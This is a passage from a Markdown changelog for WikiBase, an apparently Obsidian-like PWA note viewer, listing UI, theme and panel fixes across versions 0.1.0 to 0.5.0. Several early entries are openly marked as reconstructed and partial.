- **Outline panel fold carrots + collapse state deliberately not built this session** — carved out to a dedicated session (spec logged in `kickoff-prompt.md`, section ③b).

---

## 0.5.0 — 2026-07-16 *(was v0.9a-3)*

**Changed:** `index.html`

- Fixed nested callouts — `>>` and `>>>` now render as proper nested callouts/blockquotes (previously only one level of `>` worked).
- Sidebar and right-panel resize handles now require a double-click to collapse, not a single click.
- Fixed a bug where opening Help left the Outline panel showing the previous file's headings; clicking one could error out.
- Rebuilt the Links panel: now shows the current file's own links, categorized as MD Files / Websites / Folders / Other, above the existing (session-scoped) Backlinks list.
- Added per-heading collapse memory — folded sections now persist per file, like Obsidian.
- Tuned spacing above/below headings, especially around the H2 underline.
- **Not fixed, tracked open:** a Markdown file reportedly froze the app once. Held pending reproduction — need the actual file to diagnose properly instead of guessing at a fix.

---

## 0.4.0 — 2026-07-16 *(was v0.9a-2)*

**Changed:** `index.html`

- Added a manual PWA update-available indicator (up-arrow icon, appears when a new version has taken over the service worker; click reloads).
- Reworked the Review tab: vault-wide overview (File changes / New files) always shown at the top, per-file card list unchanged below it.

---

## 0.3.1 — 2026-07-16 *(was v0.9a-1)*

**Changed:** `index.html`

- Moved the file audit out of Settings entirely; folded into the Review changes screen as a "New Files" section.
- Fixed review-card click sometimes highlighting the wrong line in the reader (was matching short blocks, often the title, instead of the actual change).
- Fixed Minimal theme header colors — pulled the real hex values from Obsidian Minimal's own theme.css instead of placeholder colors.

---

## 0.3.0 — 2026-07-16 *(was v0.9a)*

**Changed:** `index.html`

- Fixed a boot bug where nested open subfolders got stuck on "Loading…" (only top-level open folders were being preloaded).
- Added Settings → Navigation → "Open last note" (default on) — boot reopens the last file you had open instead of restoring exact folder state.
- Compressed Header colors + Background color into one settings row.
- Added a read-only file audit (flags files WikiBase has never written to, i.e. never touched/reviewed).
- Fixed Minimal theme H1/H2 color swap.

---

## 0.2.0 — 2026-07-16 *(was v0.8e-1, reconstructed, partial)*

**Changed:** `index.html`

- Minimal theme identity work, H2 underline toggle, image-size syntax (`![[img.png|width]]`), Theme settings sub-grouping.
- Full change detail not captured at the time — flagged as a documentation gap, not reconstructed further.

---

## 0.1.1 — 2026-07-16 *(was v0.8d, reconstructed, partial)*

**Changed:** `index.html`

- Incremental theme/settings work between v0.8c and v0.8e-1. Detail not captured at the time.

---

## 0.1.0 — 2026-07-16 *(was v0.8c, reconstructed, partial)*

**Changed:** `index.html`

- Earliest of the untracked same-day sessions. Detail not captured at the time.
